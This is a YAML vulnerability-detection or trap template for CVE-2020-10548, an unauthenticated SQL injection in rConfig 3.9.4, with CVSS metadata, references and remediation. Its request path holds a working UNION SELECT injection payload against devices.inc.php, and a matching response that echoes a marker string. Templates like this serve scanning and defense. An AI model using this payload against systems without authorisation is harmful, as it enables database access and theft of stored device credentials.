id: CVE-2020-10548
info:
  name: rConfig 3.9.4 - SQL Injection
  author: madrobot
  description: rConfig 3.9.4 and previous versions have unauthenticated devices.inc.php
    SQL injection. Because nodes' passwords are stored in cleartext by default, this
    vulnerability leads to lateral movement, granting an attacker access to monitored
    network devices.
  severity: critical
  impact: 'Successful exploitation of this vulnerability allows an attacker to execute
    arbitrary SQL queries, potentially leading to unauthorized access, data manipulation.

    '
  remediation: 'Upgrade to a patched version of rConfig or apply the necessary security
    patches provided by the vendor.

    '
  reference:
  - https://github.com/theguly/exploits/blob/master/CVE-2020-10548.py
  - https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/
  - https://nvd.nist.gov/vuln/detail/CVE-2020-10548
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-10548
    cwe-id: CWE-89
    epss-score: 0.45422
    epss-percentile: 0.97076
    cpe: cpe:2.3:a:rconfig:rconfig:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: rconfig
    product: rconfig
  tags: cve,cve2020,rconfig,sqli
traps:
- request:
    method: GET
    path: /devices.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+--+&searchColumn=n.id&searchOption=contains
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: '[project-discovery]'
